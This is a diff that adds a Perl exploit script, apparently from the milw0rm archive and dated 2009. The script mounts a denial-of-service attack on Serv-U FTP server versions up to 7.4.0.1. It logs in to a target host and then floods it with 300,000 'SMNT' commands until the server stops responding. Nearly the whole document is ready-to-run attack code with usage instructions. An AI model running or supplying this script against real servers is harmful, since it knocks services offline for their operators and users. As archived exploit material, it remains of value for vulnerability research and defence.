@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+# Soft    : FTP Serv-U
+# Version : v7.4.0.1
+#
+# Denial of Service in Serv-u up to 7.4.0.1 (no crash)
+# Just the server is saturated, it stops responding.
+#
+# Author: Jonathan Salwan
+# Mail: submit [AT] shell-storm.org
+# Web: http://www.shell-storm.org
+
+
+use IO::Socket;
+print "[+] Author : Jonathan Salwan \n";
+print "[+] Soft: FTP Serv-U\n";
+
+	if (@ARGV < 3)
+		{
+ 		print "[*] Usage: <serv-u.pl> <host> <port>\n";
+ 		print "[*] Exemple: serv-u.pl 127.0.0.1 21 jonathan toto\n";
+ 		exit;
+		}
+
+	$ip 	= $ARGV[0];
+	$port 	= $ARGV[1];
+	$user	= $ARGV[2];
+	$pass	= $ARGV[3];
+
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Connecting: Failed!\n";
+
+print "\n[+] Connecting: Ok!\n";
+print "[+] Sending request...\n";
+
+
+$evil =	"SMNT\r\n" x 300000;
+
+$after = "\x2A\x2A";
+
+	print $socket "USER $user\r\n";
+	print $socket "PASS $pass.$after\r\n";
+	print $socket "$evil";
+	
+		sleep(1);	
+		close($socket);
+
+print "[+]Done! the server is saturated.\n";
+
+# milw0rm.com [2009-03-16]
